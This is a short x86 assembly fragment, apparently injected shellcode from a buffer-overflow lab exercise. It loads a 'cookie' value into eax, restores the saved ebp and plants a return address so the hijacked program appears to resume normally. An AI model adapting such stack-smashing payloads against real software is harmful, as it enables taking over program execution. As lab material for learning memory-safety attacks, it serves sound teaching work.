movl $0x238d4669, %eax # move cookie value to eax
movl $0x55685ff0, %ebp # restore ebp
movl $0x8048f15, 0x55682f08 #copy return address to memory
ret
